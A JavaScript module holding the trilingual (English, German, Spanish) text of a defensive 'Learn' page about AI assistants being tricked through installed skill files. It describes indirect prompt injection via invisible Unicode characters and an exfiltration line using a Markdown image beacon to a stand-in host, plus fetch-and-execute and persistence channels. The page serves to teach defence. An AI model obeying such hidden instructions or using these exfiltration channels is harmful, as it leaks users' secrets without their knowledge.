import { slugify } from '../search.mjs';
import { href, SITE } from '../layout.mjs';

export const slug = 'learn';

export const meta = {
  en: {
    title: 'Learn — how AI assistants can be tricked, in plain language · Skillry',
    description:
      'What an AI assistant actually loads, how text can hide instructions, what can go wrong, and what you can do about it. Two depths: plain language, or the technical detail.',
  },
  de: {
    title: 'Lernen — wie KI-Assistenten ausgetrickst werden, im Klartext · Skillry',
    description:
      'Was ein KI-Assistent wirklich lädt, wie Text Anweisungen verstecken kann, was schiefgehen kann und was du dagegen tun kannst. Zwei Tiefen: Klartext oder technisches Detail.',
  },
  es: {
    title: 'Aprender — cómo se engaña a los asistentes de IA, en lenguaje claro · Skillry',
    description:
      'Qué carga de verdad un asistente de IA, cómo un texto puede esconder instrucciones, qué puede salir mal y qué puedes hacer al respecto. Dos profundidades: lenguaje claro o detalle técnico.',
  },
};

const T = {
  en: {
    eyebrow: 'Learn',
    h1: 'How AI assistants get tricked, and what you can do.',
    lede:
      'No fear-mongering and no jargon wall. Every section comes at two depths — pick the one you want, switch any time. Nothing here needs you to be a programmer.',
    tocTitle: 'On this page',
    tocLabel: 'Sections of this page',
    basic: 'Plain language',
    deep: 'Technical detail',
    toggleLabel: 'Choose a depth',

    topics: [
      {
        n: '01',
        h: 'What does an assistant actually load?',
        basic: `<p>When you ask an AI assistant to do something, it doesn't only see your message. It also sees instructions it was given beforehand — including files you installed called <strong>skills</strong>.</p>
<p>A skill is a plain text file. It says things like <em>"when the user mentions a PDF, do this."</em> You can open one in Notepad. There is no compiler, no signature, no app store review. You download it, drop it in a folder, and from then on your assistant reads it every time it might be relevant.</p>
<p>That is genuinely useful — it is how you teach an assistant your workflow. It also means <strong>whoever wrote that file is talking to your assistant, in your session, with your permissions.</strong></p>`,
        deep: `<p>A skill is a Markdown file with YAML front-matter, conventionally <code>SKILL.md</code>. The front-matter carries a <code>name</code>, a <code>description</code> the runtime uses to decide relevance, and often an <code>allowed-tools</code> list. The body is prose instructions injected into the model's context.</p>
<p>Three properties make this a supply chain rather than a config format:</p>
<ul>
<li><strong>No integrity layer.</strong> No signature, no checksum, no publisher identity. The file is trusted because it is on disk.</li>
<li><strong>Context-level privilege.</strong> Injected text is not sandboxed from your request. It arrives as instruction, not as data.</li>
<li><strong>Silent updates.</strong> Pull the repository, sync the plugin, and the file that runs tomorrow is not the file you read today.</li>
</ul>
<p><code>allowed-tools</code> constrains the <em>verb</em>. It says nothing about the <em>object</em> — <code>Read</code> is a true and useless description of a skill that reads your private keys.</p>`,
      },
      {
        n: '02',
        h: 'How can text hide something?',
        basic: `<p>Not every character in a text file makes a mark on the screen. Some are there to control spacing or letter shapes, and they render as nothing at all — but they still exist in the file, they survive copy and paste, and a program reading the file sees them perfectly.</p>
<p>So you can write a paragraph that looks completely normal, and slip a second, invisible paragraph in between two sentences. Your eyes see a PDF helper. The assistant reads the PDF helper <em>plus</em> the hidden part.</p>
<p>There are variations on the trick: characters from other alphabets that look identical to ours (a Russian <span class="mono">с</span> is not a Latin <span class="mono">c</span>, but you cannot tell), and characters that make a line <em>display</em> in a different order than it actually runs.</p>`,
        deep: `<p>Unicode has several ranges with no visual footprint that survive normal text handling:</p>
<ul>
<li><strong>Zero-width characters</strong> (<code>U+200B</code>–<code>U+200D</code>, <code>U+FEFF</code>) — used as bits, eight per smuggled character.</li>
<li><strong>The Tags block</strong> (<code>U+E0000</code>–<code>U+E007F</code>) — a complete shadow ASCII alphabet, offset by a fixed amount, rendering as nothing.</li>
<li><strong>Variation selectors</strong> (<code>U+FE00</code>–<code>U+FE0F</code>, <code>U+E0100</code>–<code>U+E01EF</code>) — one byte each, attaching invisibly to the preceding glyph, commonly an emoji.</li>
<li><strong>Bidirectional overrides</strong> (<code>U+202A</code>–<code>U+202E</code>) — reorder how a line displays without changing what executes. Published as <em>Trojan Source</em>.</li>
<li><strong>Confusables</strong> — mixed-script homoglyphs that defeat both a reader and a literal denylist.</li>
</ul>
<p>The countermeasure is not detection alone but <strong>recovery</strong>: decode the carrier back to text and show the reviewer the sentence. A finding that says "1,000 invisible codepoints" is a curiosity; one that prints what they spell is an argument.</p>`,
      },
      {
        n: '03',
        h: 'What can actually go wrong?',
        basic: `<p>The hidden text is an instruction, and the assistant treats instructions as instructions. The realistic bad outcomes are ordinary ones:</p>
<ul>
<li><strong>Something is read that should not be.</strong> Password files, access tokens, browser sessions.</li>
<li><strong>Something leaves your machine.</strong> Often not as an obvious upload — an image link is enough, because displaying an image means requesting a URL, and the data can ride along in that URL.</li>
<li><strong>Something is done quietly.</strong> The hidden text can ask the assistant not to mention what it did.</li>
</ul>
<p>None of that needs a clever exploit or a bug in the software. It just needs you to install a file nobody checked.</p>`,
        deep: `<p>This is <strong>indirect prompt injection</strong>: the payload arrives through content the model consumes rather than through the user turn. The interesting part is not the instruction, it is the egress channel.</p>
<ul>
<li><strong>Markdown image beacons.</strong> <code>![x](https://host/p?d=SECRET)</code> is fetched by the client at render time. No tool call, no approval prompt, and the data has already left before anyone reads the reply.</li>
<li><strong>Fetch-and-execute.</strong> A pipeline that pipes a download straight into a shell — the reviewed URL and the executed bytes are different objects, and the server picks when they differ.</li>
<li><strong>DNS.</strong> Rarely filtered, rarely logged at the same fidelity as HTTP.</li>
<li><strong>Persistence.</strong> A scheduled task or a shell profile line outlives removal of the skill entirely.</li>
</ul>
<p>Defences that only inspect tool calls miss the first one completely, which is why the image-beacon rule is scored critical.</p>`,
      },
      {
        n: '04',
        h: 'Which models and providers can you trust?',
        basic: `<p>You cannot read a model's mind, and nobody can hand you a certificate that one is honest. What you <em>can</em> control is much more practical:</p>
<ul>
<li><strong>Where it runs.</strong> A model on your own machine cannot send your files anywhere, because it has no network of its own.</li>
<li><strong>What it can reach.</strong> Most damage needs a tool — reading files, running commands, opening URLs. Grant those deliberately.</li>
<li><strong>Whether you can swap it out.</strong> Software that locks you to one provider has made the decision for you. Software that speaks a standard interface lets you change your mind.</li>
</ul>
<p>Be sceptical of anyone claiming a model is "verified safe". The honest claim is narrower and more useful: <em>this is what it can reach, and here is how you change that.</em></p>`,
        deep: `<p>Model provenance is a genuinely open problem. Weights are not meaningfully auditable by reading them, published evaluations are self-reported, and "safety-tuned" says something about refusal behaviour rather than about backdoors. Treat the model as untrusted and constrain the boundary instead:</p>
<ul>
<li><strong>Egress is the real control.</strong> Local inference removes the exfiltration channel outright. If you must use a hosted endpoint, know which one and log it.</li>
<li><strong>Tool surface over model choice.</strong> Capability granted, not model identity, determines blast radius. Enumerate what each tool can touch.</li>
<li><strong>Interface portability.</strong> An OpenAI-compatible endpoint is a commitment you can reverse; a proprietary integration is not.</li>
<li><strong>Content provenance separately.</strong> Even a perfectly honest model will faithfully follow an instruction that was smuggled into its context. Model trust and content trust are different problems, and this site is about the second one.</li>
</ul>`,
      },
      {
        n: '05',
        h: 'What should you actually do?',
        basic: `<p>Five habits, in order of how much they buy you:</p>
<ol>
<li><strong>Know what you have installed.</strong> Most people have never looked. That is the first surprise.</li>
<li><strong>Check anything from a stranger before you install it</strong> — not by squinting at it, but with something that reads the bytes.</li>
<li><strong>Write down what you approved.</strong> Then a later change becomes visible instead of invisible.</li>
<li><strong>Re-check now and then.</strong> The file that changes after you approved it is the one worth catching.</li>
<li><strong>Grant permissions narrowly.</strong> If a skill only needs to read, it does not need to run commands.</li>
</ol>`,
        deep: `<p>Operationally, the checklist maps onto four commands and a CI job:</p>
<pre><span class="c"># what is installed, and does any of it carry something hidden</span>
airlock scan --installed

<span class="c"># record the decision as a signed lockfile</span>
airlock keygen &amp;&amp; airlock lock ~/.claude/skills

<span class="c"># enforce it — exit 1 on any drift</span>
airlock verify ~/.claude/skills</pre>
<p>The verification step is the one that matters, because scanning is a point-in-time statement and skills update silently. Pin the bytes, put <code>verify</code> in continuous integration, and a change cannot reach your main branch without somebody seeing it.</p>
<p>Two failure modes worth internalising: a <em>pass</em> means no rule matched, not that the file is safe; and a heuristic finding is a prompt to look, not a verdict. Any tool that blurs those two is training you to ignore it.</p>`,
      },
    ],

    ctaH: 'Try it on your own machine',
    ctaP: 'Three commands, no account, nothing uploaded. It reads bytes and exits.',
    ctaBtn: 'Get AIRLOCK',
    ctaAlt: 'Browse the skill index',
    askH: 'Something here unclear?',
    askP: 'Ask in the forum. Beginner questions are the point of it — there is no such thing as one that is too basic.',
    askBtn: 'Go to the forum',
  },

  de: {
    eyebrow: 'Lernen',
    h1: 'Wie KI-Assistenten ausgetrickst werden — und was du tun kannst.',
    lede:
      'Keine Panikmache und keine Fachbegriff-Wand. Jeder Abschnitt kommt in zwei Tiefen — nimm die, die du willst, wechsle jederzeit. Nichts hier setzt voraus, dass du programmieren kannst.',
    tocTitle: 'Auf dieser Seite',
    tocLabel: 'Abschnitte dieser Seite',
    basic: 'Klartext',
    deep: 'Technisches Detail',
    toggleLabel: 'Tiefe wählen',

    topics: [
      {
        n: '01',
        h: 'Was lädt ein Assistent eigentlich?',
        basic: `<p>Wenn du einen KI-Assistenten um etwas bittest, sieht er nicht nur deine Nachricht. Er sieht auch Anweisungen, die er vorher bekommen hat — darunter Dateien, die du installiert hast: <strong>Skills</strong>.</p>
<p>Ein Skill ist eine simple Textdatei. Da steht sowas drin wie <em>„wenn der Nutzer ein PDF erwähnt, mach Folgendes."</em> Du kannst sie im Editor aufmachen. Es gibt keinen Compiler, keine Signatur, keine App-Store-Prüfung. Du lädst sie herunter, legst sie in einen Ordner, und ab dann liest dein Assistent sie jedes Mal, wenn sie relevant sein könnte.</p>
<p>Das ist wirklich nützlich — so bringt man einem Assistenten den eigenen Arbeitsablauf bei. Es heißt aber auch: <strong>Wer diese Datei geschrieben hat, spricht mit deinem Assistenten, in deiner Sitzung, mit deinen Rechten.</strong></p>`,
        deep: `<p>Ein Skill ist eine Markdown-Datei mit YAML-Frontmatter, üblicherweise <code>SKILL.md</code>. Das Frontmatter trägt <code>name</code>, eine <code>description</code>, anhand derer die Laufzeit über Relevanz entscheidet, und oft eine <code>allowed-tools</code>-Liste. Der Body sind Prosa-Anweisungen, die in den Kontext des Modells injiziert werden.</p>
<p>Drei Eigenschaften machen daraus eine Supply Chain statt eines Konfigurationsformats:</p>
<ul>
<li><strong>Keine Integritätsschicht.</strong> Keine Signatur, keine Prüfsumme, keine Herausgeber-Identität. Die Datei wird vertraut, weil sie auf der Platte liegt.</li>
<li><strong>Privileg auf Kontextebene.</strong> Injizierter Text ist nicht von deiner Anfrage getrennt. Er kommt als Anweisung an, nicht als Daten.</li>
<li><strong>Stille Updates.</strong> Repository ziehen, Plugin synchronisieren — und die Datei, die morgen läuft, ist nicht die, die du heute gelesen hast.</li>
</ul>
<p><code>allowed-tools</code> beschränkt das <em>Verb</em>. Über das <em>Objekt</em> sagt es nichts — <code>Read</code> ist über einen Skill, der deine privaten Schlüssel liest, eine wahre und nutzlose Beschreibung.</p>`,
      },
      {
        n: '02',
        h: 'Wie kann Text etwas verstecken?',
        basic: `<p>Nicht jedes Zeichen in einer Textdatei hinterlässt eine Spur auf dem Bildschirm. Manche steuern Abstände oder Buchstabenformen und werden als gar nichts dargestellt — sie stehen aber trotzdem in der Datei, überleben Copy-and-Paste, und ein Programm, das die Datei liest, sieht sie einwandfrei.</p>
<p>Du kannst also einen völlig normal aussehenden Absatz schreiben und einen zweiten, unsichtbaren zwischen zwei Sätze schieben. Deine Augen sehen eine PDF-Hilfe. Der Assistent liest die PDF-Hilfe <em>plus</em> den versteckten Teil.</p>
<p>Es gibt Varianten davon: Zeichen aus anderen Alphabeten, die identisch aussehen (ein russisches <span class="mono">с</span> ist kein lateinisches <span class="mono">c</span>, aber man sieht es nicht), und Zeichen, die eine Zeile in einer anderen Reihenfolge <em>anzeigen</em> als sie tatsächlich läuft.</p>`,
        deep: `<p>Unicode hat mehrere Bereiche ohne visuelle Spur, die normale Textverarbeitung überleben:</p>
<ul>
<li><strong>Zero-Width-Zeichen</strong> (<code>U+200B</code>–<code>U+200D</code>, <code>U+FEFF</code>) — als Bits benutzt, acht pro geschmuggeltem Zeichen.</li>
<li><strong>Der Tags-Block</strong> (<code>U+E0000</code>–<code>U+E007F</code>) — ein vollständiges Schatten-ASCII-Alphabet mit festem Versatz, das als nichts dargestellt wird.</li>
<li><strong>Variation Selectors</strong> (<code>U+FE00</code>–<code>U+FE0F</code>, <code>U+E0100</code>–<code>U+E01EF</code>) — je ein Byte, unsichtbar an das vorherige Zeichen gebunden, häufig ein Emoji.</li>
<li><strong>Bidirektionale Overrides</strong> (<code>U+202A</code>–<code>U+202E</code>) — ändern die Anzeigereihenfolge, ohne zu ändern, was ausgeführt wird. Veröffentlicht als <em>Trojan Source</em>.</li>
<li><strong>Confusables</strong> — Homoglyphen aus gemischten Schriften, die sowohl einen Leser als auch eine wörtliche Sperrliste aushebeln.</li>
</ul>
<p>Die Gegenmaßnahme ist nicht Erkennung allein, sondern <strong>Rückgewinnung</strong>: den Träger zurück in Text dekodieren und dem Prüfenden den Satz zeigen. Ein Befund „1.000 unsichtbare Codepoints" ist eine Kuriosität; einer, der ausgibt, was sie buchstabieren, ist ein Argument.</p>`,
      },
      {
        n: '03',
        h: 'Was kann tatsächlich schiefgehen?',
        basic: `<p>Der versteckte Text ist eine Anweisung, und der Assistent behandelt Anweisungen als Anweisungen. Die realistisch schlechten Ausgänge sind ganz gewöhnliche:</p>
<ul>
<li><strong>Etwas wird gelesen, das nicht gelesen werden sollte.</strong> Passwortdateien, Zugangstoken, Browser-Sitzungen.</li>
<li><strong>Etwas verlässt deine Maschine.</strong> Oft nicht als offensichtlicher Upload — ein Bild-Link reicht, denn ein Bild anzuzeigen heißt, eine URL abzurufen, und die Daten können in dieser URL mitreisen.</li>
<li><strong>Etwas passiert still.</strong> Der versteckte Text kann den Assistenten bitten, nicht zu erwähnen, was er getan hat.</li>
</ul>
<p>Nichts davon braucht einen raffinierten Exploit oder einen Fehler in der Software. Es braucht nur, dass du eine Datei installierst, die niemand geprüft hat.</p>`,
        deep: `<p>Das ist <strong>indirekte Prompt Injection</strong>: Der Payload kommt über Inhalte an, die das Modell konsumiert, nicht über den Nutzer-Turn. Das Interessante ist nicht die Anweisung, sondern der Abflusskanal.</p>
<ul>
<li><strong>Markdown-Bild-Beacons.</strong> <code>![x](https://host/p?d=SECRET)</code> wird vom Client beim Rendern abgerufen. Kein Tool-Aufruf, keine Rückfrage — die Daten sind schon draußen, bevor jemand die Antwort liest.</li>
<li><strong>Fetch-and-Execute.</strong> Eine Pipeline, die einen Download direkt in eine Shell schiebt — die geprüfte URL und die ausgeführten Bytes sind verschiedene Objekte, und der Server bestimmt, wann sie sich unterscheiden.</li>
<li><strong>DNS.</strong> Selten gefiltert, selten so genau protokolliert wie HTTP.</li>
<li><strong>Persistenz.</strong> Eine geplante Aufgabe oder eine Zeile im Shell-Profil überlebt das Entfernen des Skills komplett.</li>
</ul>
<p>Abwehrmaßnahmen, die nur Tool-Aufrufe prüfen, übersehen den ersten Fall vollständig — deshalb ist die Bild-Beacon-Regel als kritisch eingestuft.</p>`,
      },
      {
        n: '04',
        h: 'Welchen Modellen und Anbietern kannst du trauen?',
        basic: `<p>Du kannst einem Modell nicht in den Kopf schauen, und niemand kann dir ein Zertifikat ausstellen, dass eines ehrlich ist. Was du <em>sehr wohl</em> kontrollieren kannst, ist viel praktischer:</p>
<ul>
<li><strong>Wo es läuft.</strong> Ein Modell auf deiner eigenen Maschine kann deine Dateien nirgendwohin schicken, weil es kein eigenes Netz hat.</li>
<li><strong>Woran es rankommt.</strong> Der meiste Schaden braucht ein Werkzeug — Dateien lesen, Befehle ausführen, URLs öffnen. Vergib das bewusst.</li>
<li><strong>Ob du wechseln kannst.</strong> Software, die dich an einen Anbieter bindet, hat die Entscheidung für dich getroffen. Software, die eine Standardschnittstelle spricht, lässt dich umentscheiden.</li>
</ul>
<p>Sei skeptisch bei jedem, der behauptet, ein Modell sei „geprüft sicher". Die ehrliche Aussage ist enger und nützlicher: <em>Das hier kann es erreichen, und so änderst du das.</em></p>`,
        deep: `<p>Modell-Provenienz ist ein wirklich offenes Problem. Gewichte lassen sich durch Lesen nicht sinnvoll auditieren, veröffentlichte Evaluationen sind selbst berichtet, und „safety-tuned" sagt etwas über Ablehnungsverhalten aus, nicht über Hintertüren. Behandle das Modell als nicht vertrauenswürdig und beschränke stattdessen die Grenze:</p>
<ul>
<li><strong>Egress ist die eigentliche Kontrolle.</strong> Lokale Inferenz entfernt den Exfiltrationskanal komplett. Wenn ein gehosteter Endpunkt sein muss: wissen welcher, und protokollieren.</li>
<li><strong>Werkzeugfläche vor Modellwahl.</strong> Die vergebene Fähigkeit bestimmt den Wirkungsradius, nicht die Modellidentität. Zähl auf, was jedes Werkzeug anfassen kann.</li>
<li><strong>Portable Schnittstelle.</strong> Ein OpenAI-kompatibler Endpunkt ist eine umkehrbare Festlegung; eine proprietäre Integration nicht.</li>
<li><strong>Inhalts-Provenienz getrennt betrachten.</strong> Auch ein vollkommen ehrliches Modell befolgt getreu eine Anweisung, die in seinen Kontext geschmuggelt wurde. Modellvertrauen und Inhaltsvertrauen sind verschiedene Probleme — und diese Seite handelt vom zweiten.</li>
</ul>`,
      },
      {
        n: '05',
        h: 'Was solltest du konkret tun?',
        basic: `<p>Fünf Gewohnheiten, sortiert danach, wie viel sie dir bringen:</p>
<ol>
<li><strong>Wissen, was du installiert hast.</strong> Die meisten haben nie nachgesehen. Das ist die erste Überraschung.</li>
<li><strong>Alles von Fremden prüfen, bevor du es installierst</strong> — nicht durch Draufschielen, sondern mit etwas, das die Bytes liest.</li>
<li><strong>Aufschreiben, was du freigegeben hast.</strong> Dann wird eine spätere Änderung sichtbar statt unsichtbar.</li>
<li><strong>Ab und zu nachprüfen.</strong> Die Datei, die sich nach deiner Freigabe ändert, ist die, die es zu erwischen gilt.</li>
<li><strong>Rechte eng vergeben.</strong> Wenn ein Skill nur lesen muss, braucht er keine Befehlsausführung.</li>
</ol>`,
        deep: `<p>Operativ bildet sich die Checkliste auf vier Befehle und einen CI-Job ab:</p>
<pre><span class="c"># was ist installiert, und trägt etwas davon Verstecktes</span>
airlock scan --installed

<span class="c"># die Entscheidung als signiertes Lockfile festhalten</span>
airlock keygen &amp;&amp; airlock lock ~/.claude/skills

<span class="c"># durchsetzen — Exit 1 bei jeder Drift</span>
airlock verify ~/.claude/skills</pre>
<p>Der Verifikationsschritt ist der entscheidende, denn ein Scan ist eine Momentaufnahme und Skills aktualisieren sich still. Bytes festnageln, <code>verify</code> in die CI, und eine Änderung kommt nicht in den Hauptbranch, ohne dass jemand sie sieht.</p>
<p>Zwei Fehlermodi, die man verinnerlichen sollte: Ein <em>pass</em> heißt, dass keine Regel angeschlagen hat — nicht, dass die Datei sicher ist. Und ein heuristischer Befund heißt „schau hin", nicht „Urteil". Jedes Werkzeug, das diese beiden verwischt, erzieht dich dazu, es zu ignorieren.</p>`,
      },
    ],

    ctaH: 'Auf der eigenen Maschine ausprobieren',
    ctaP: 'Drei Befehle, kein Konto, nichts wird hochgeladen. Es liest Bytes und beendet sich.',
    ctaBtn: 'AIRLOCK holen',
    ctaAlt: 'Skill-Index durchsuchen',
    askH: 'Etwas hier unklar?',
    askP: 'Frag im Forum. Einsteigerfragen sind genau der Sinn davon — es gibt keine, die zu einfach wäre.',
    askBtn: 'Zum Forum',
  },

  es: {
    eyebrow: 'Aprender',
    h1: 'Cómo se engaña a los asistentes de IA — y qué puedes hacer.',
    lede:
      'Sin alarmismo y sin muro de jerga. Cada sección viene en dos profundidades — elige la que quieras, cambia cuando quieras. Nada de esto exige que sepas programar.',
    tocTitle: 'En esta página',
    tocLabel: 'Secciones de esta página',
    basic: 'Lenguaje claro',
    deep: 'Detalle técnico',
    toggleLabel: 'Elegir profundidad',

    topics: [
      {
        n: '01',
        h: '¿Qué carga un asistente en realidad?',
        basic: `<p>Cuando le pides algo a un asistente de IA, no ve solo tu mensaje. También ve instrucciones que recibió antes — entre ellas, archivos que tú instalaste: <strong>skills</strong>.</p>
<p>Un skill es un archivo de texto simple. Dentro pone cosas como <em>«cuando el usuario mencione un PDF, haz lo siguiente»</em>. Puedes abrirlo en el bloc de notas. No hay compilador, ni firma, ni revisión de tienda de aplicaciones. Lo descargas, lo dejas en una carpeta, y desde entonces tu asistente lo lee cada vez que pueda ser relevante.</p>
<p>Eso es genuinamente útil — así se le enseña a un asistente tu forma de trabajar. Pero también significa: <strong>quien escribió ese archivo le está hablando a tu asistente, en tu sesión, con tus permisos.</strong></p>`,
        deep: `<p>Un skill es un archivo Markdown con front-matter YAML, por convención <code>SKILL.md</code>. El front-matter lleva un <code>name</code>, una <code>description</code> que la runtime usa para decidir la relevancia, y a menudo una lista <code>allowed-tools</code>. El cuerpo son instrucciones en prosa que se inyectan en el contexto del modelo.</p>
<p>Tres propiedades convierten esto en una cadena de suministro y no en un formato de configuración:</p>
<ul>
<li><strong>Sin capa de integridad.</strong> Sin firma, sin suma de comprobación, sin identidad del editor. El archivo goza de confianza porque está en el disco.</li>
<li><strong>Privilegio a nivel de contexto.</strong> El texto inyectado no está aislado de tu petición. Llega como instrucción, no como datos.</li>
<li><strong>Actualizaciones silenciosas.</strong> Tira del repositorio, sincroniza el plugin — y el archivo que corre mañana no es el que leíste hoy.</li>
</ul>
<p><code>allowed-tools</code> restringe el <em>verbo</em>. Del <em>objeto</em> no dice nada — <code>Read</code> es una descripción verdadera e inútil de un skill que lee tus claves privadas.</p>`,
      },
      {
        n: '02',
        h: '¿Cómo puede un texto esconder algo?',
        basic: `<p>No todos los caracteres de un archivo de texto dejan huella en la pantalla. Algunos controlan espacios o formas de letras y se muestran como nada en absoluto — pero siguen estando en el archivo, sobreviven al copiar y pegar, y un programa que lea el archivo los ve perfectamente.</p>
<p>Así que puedes escribir un párrafo de aspecto completamente normal y colar un segundo párrafo, invisible, entre dos frases. Tus ojos ven una ayuda de PDF. El asistente lee la ayuda de PDF <em>más</em> la parte escondida.</p>
<p>Hay variantes del truco: caracteres de otros alfabetos que parecen idénticos a los nuestros (una <span class="mono">с</span> rusa no es una <span class="mono">c</span> latina, pero no se nota), y caracteres que hacen que una línea se <em>muestre</em> en un orden distinto del que realmente ejecuta.</p>`,
        deep: `<p>Unicode tiene varios rangos sin huella visual que sobreviven al tratamiento normal de texto:</p>
<ul>
<li><strong>Caracteres de ancho cero</strong> (<code>U+200B</code>–<code>U+200D</code>, <code>U+FEFF</code>) — usados como bits, ocho por carácter contrabandeado.</li>
<li><strong>El bloque Tags</strong> (<code>U+E0000</code>–<code>U+E007F</code>) — un alfabeto ASCII en la sombra, completo, con desplazamiento fijo, que se muestra como nada.</li>
<li><strong>Selectores de variación</strong> (<code>U+FE00</code>–<code>U+FE0F</code>, <code>U+E0100</code>–<code>U+E01EF</code>) — un byte cada uno, pegados de forma invisible al glifo anterior, habitualmente un emoji.</li>
<li><strong>Anulaciones bidireccionales</strong> (<code>U+202A</code>–<code>U+202E</code>) — reordenan cómo se muestra una línea sin cambiar lo que se ejecuta. Publicado como <em>Trojan Source</em>.</li>
<li><strong>Confusables</strong> — homoglifos de escrituras mezcladas que burlan tanto a un lector como a una lista de bloqueo literal.</li>
</ul>
<p>La contramedida no es solo detección sino <strong>recuperación</strong>: decodificar el portador de vuelta a texto y enseñarle al revisor la frase. Un hallazgo que dice «1.000 puntos de código invisibles» es una curiosidad; uno que imprime lo que deletrean es un argumento.</p>`,
      },
      {
        n: '03',
        h: '¿Qué puede salir mal de verdad?',
        basic: `<p>El texto escondido es una instrucción, y el asistente trata las instrucciones como instrucciones. Los malos desenlaces realistas son de lo más corrientes:</p>
<ul>
<li><strong>Se lee algo que no debería leerse.</strong> Archivos de contraseñas, tokens de acceso, sesiones del navegador.</li>
<li><strong>Algo sale de tu máquina.</strong> A menudo no como una subida evidente — basta un enlace de imagen, porque mostrar una imagen significa pedir una URL, y los datos pueden viajar dentro de esa URL.</li>
<li><strong>Algo pasa en silencio.</strong> El texto escondido puede pedirle al asistente que no mencione lo que hizo.</li>
</ul>
<p>Nada de eso necesita un exploit ingenioso ni un fallo en el software. Solo necesita que instales un archivo que nadie comprobó.</p>`,
        deep: `<p>Esto es <strong>inyección de prompt indirecta</strong>: la carga llega a través de contenido que el modelo consume, no a través del turno del usuario. Lo interesante no es la instrucción, es el canal de salida.</p>
<ul>
<li><strong>Balizas de imagen en Markdown.</strong> <code>![x](https://host/p?d=SECRET)</code> lo descarga el cliente al renderizar. Sin llamada a herramienta, sin pregunta de aprobación — los datos ya están fuera antes de que nadie lea la respuesta.</li>
<li><strong>Fetch-and-execute.</strong> Una tubería que mete una descarga directamente en una shell — la URL revisada y los bytes ejecutados son objetos distintos, y el servidor elige cuándo difieren.</li>
<li><strong>DNS.</strong> Rara vez filtrado, rara vez registrado con la misma fidelidad que HTTP.</li>
<li><strong>Persistencia.</strong> Una tarea programada o una línea en el perfil de la shell sobrevive por completo a eliminar el skill.</li>
</ul>
<p>Las defensas que solo inspeccionan llamadas a herramientas se pierden el primer caso entero — por eso la regla de la baliza de imagen puntúa como crítica.</p>`,
      },
      {
        n: '04',
        h: '¿De qué modelos y proveedores puedes fiarte?',
        basic: `<p>No puedes leerle la mente a un modelo, y nadie puede extenderte un certificado de que uno es honesto. Lo que <em>sí</em> puedes controlar es mucho más práctico:</p>
<ul>
<li><strong>Dónde corre.</strong> Un modelo en tu propia máquina no puede enviar tus archivos a ningún sitio, porque no tiene red propia.</li>
<li><strong>A qué alcanza.</strong> La mayor parte del daño necesita una herramienta — leer archivos, ejecutar comandos, abrir URLs. Concédelas con deliberación.</li>
<li><strong>Si puedes cambiarlo.</strong> El software que te ata a un proveedor ha tomado la decisión por ti. El software que habla una interfaz estándar te deja cambiar de opinión.</li>
</ul>
<p>Sé escéptico con cualquiera que afirme que un modelo está «verificado como seguro». La afirmación honesta es más estrecha y más útil: <em>esto es lo que puede alcanzar, y así se cambia.</em></p>`,
        deep: `<p>La procedencia de los modelos es un problema genuinamente abierto. Los pesos no se pueden auditar leyéndolos, las evaluaciones publicadas son autoinformadas, y «safety-tuned» dice algo sobre el comportamiento de rechazo, no sobre puertas traseras. Trata el modelo como no confiable y restringe la frontera en su lugar:</p>
<ul>
<li><strong>La salida es el control real.</strong> La inferencia local elimina de raíz el canal de exfiltración. Si tiene que ser un endpoint alojado: saber cuál, y registrarlo.</li>
<li><strong>Superficie de herramientas antes que elección de modelo.</strong> La capacidad concedida determina el radio de daño, no la identidad del modelo. Enumera lo que cada herramienta puede tocar.</li>
<li><strong>Interfaz portable.</strong> Un endpoint compatible con OpenAI es un compromiso reversible; una integración propietaria no lo es.</li>
<li><strong>La procedencia del contenido, aparte.</strong> Incluso un modelo perfectamente honesto seguirá fielmente una instrucción que fue contrabandeada a su contexto. La confianza en el modelo y la confianza en el contenido son problemas distintos — y este sitio trata del segundo.</li>
</ul>`,
      },
      {
        n: '05',
        h: '¿Qué deberías hacer en concreto?',
        basic: `<p>Cinco hábitos, ordenados por cuánto te aportan:</p>
<ol>
<li><strong>Saber qué tienes instalado.</strong> La mayoría nunca ha mirado. Esa es la primera sorpresa.</li>
<li><strong>Comprobar todo lo que venga de desconocidos antes de instalarlo</strong> — no entornando los ojos, sino con algo que lea los bytes.</li>
<li><strong>Apuntar lo que aprobaste.</strong> Así un cambio posterior se vuelve visible en vez de invisible.</li>
<li><strong>Revisar de vez en cuando.</strong> El archivo que cambia después de tu aprobación es el que vale la pena cazar.</li>
<li><strong>Conceder permisos con tacañería.</strong> Si un skill solo necesita leer, no necesita ejecutar comandos.</li>
</ol>`,
        deep: `<p>En lo operativo, la lista se reduce a cuatro comandos y un job de CI:</p>
<pre><span class="c"># qué está instalado, y si algo de eso lleva algo escondido</span>
airlock scan --installed

<span class="c"># registrar la decisión como lockfile firmado</span>
airlock keygen &amp;&amp; airlock lock ~/.claude/skills

<span class="c"># hacerla cumplir — exit 1 ante cualquier deriva</span>
airlock verify ~/.claude/skills</pre>
<p>El paso de verificación es el que importa, porque un escaneo es una foto de un momento y los skills se actualizan en silencio. Fija los bytes, mete <code>verify</code> en la integración continua, y un cambio no llega a tu rama principal sin que alguien lo vea.</p>
<p>Dos modos de fallo que conviene interiorizar: un <em>pass</em> significa que ninguna regla saltó — no que el archivo sea seguro. Y un hallazgo heurístico significa «mira aquí», no «veredicto». Cualquier herramienta que difumine esos dos te está entrenando para ignorarla.</p>`,
      },
    ],

    ctaH: 'Pruébalo en tu propia máquina',
    ctaP: 'Tres comandos, sin cuenta, nada se sube. Lee bytes y termina.',
    ctaBtn: 'Conseguir AIRLOCK',
    ctaAlt: 'Explorar el índice de skills',
    askH: '¿Algo aquí no queda claro?',
    askP: 'Pregunta en el foro. Las preguntas de principiante son exactamente su razón de ser — no existe ninguna demasiado básica.',
    askBtn: 'Ir al foro',
  },
};

export function body(lang) {
  const t = T[lang];

  /*
   * ══ EIN VERZEICHNIS, WEIL DIE SEITE FUENF BILDSCHIRME LANG IST ═════════
   *
   * Gemessen: 4087px Hoehe, sieben Abschnitte, kein einziger Hinweis auf die
   * Form des Ganzen. Wer hier landet, sieht eine Ueberschrift und danach
   * Text — er weiss nicht, wie lang es wird, wo er steht, und kann nicht zu
   * der einen Frage springen, die er wirklich hat.
   *
   * Der Anker kommt aus DERSELBEN `slugify`, die auch `anchorHeadings` in
   * layout.mjs benutzt — importiert, nicht nachgebaut.
   *
   * Nachgebaut stand hier zuerst `[^a-z0-9]+`. Das sieht richtig aus und ist
   * es fuer Englisch auch. Im Deutschen zerhackt es jeden Umlaut: aus
   * "Was laedt ein Assistent eigentlich?" wurde `was-l-dt-...`, waehrend die
   * echte Regel mit \p{L} `was-laedt-...` bildet. Zwei tote Verweise, und
   * zwar nur in einer Sprache — die englische Seite war fehlerfrei und hat
